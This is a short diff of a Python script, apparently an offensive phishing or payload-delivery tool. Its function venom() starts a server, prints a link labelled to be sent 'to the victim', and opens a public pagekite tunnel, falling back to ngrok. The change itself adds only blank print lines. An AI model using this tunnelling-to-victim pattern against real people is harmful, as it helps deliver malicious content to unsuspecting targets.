@@ -117,6 +117,9 @@ def venom():
            print("###SERVER STARTED###")
            print(" ")
            print(f" SEND THIS LINK TO THE VICTIM ====>>>>   pagekite {pkname}.pagekite.me/{name}")
+           print("  ")
+           print(" ")
+           print(" ")
            os.system(f"pagekite {pkname}.pagekite.me")
       else:
            print("NO INPUT ENTERED BY USER,,,,,,USING DEFAULT using NGROK....")
